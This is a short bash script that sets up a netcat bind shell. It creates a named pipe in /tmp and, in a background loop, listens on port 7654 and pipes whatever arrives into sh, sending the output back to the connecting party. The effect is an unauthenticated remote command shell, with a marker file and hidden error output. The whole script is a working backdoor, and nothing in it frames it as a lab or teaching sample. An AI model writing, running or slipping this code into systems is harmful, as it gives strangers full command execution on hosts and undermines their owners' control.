#!/bin/bash

cd /tmp
mkfifo FIFO > /dev/null 2>&1

listen() {
  if [ -f .running ]; then
    return;
  fi;

  while [ 1 ]; do
    nc -l -p 7654 < FIFO 2>.error | sh > FIFO;
    if [ ! -f .running ]; then
      touch .running;
    fi;
  done;
}

listen & > /dev/null 2>&1
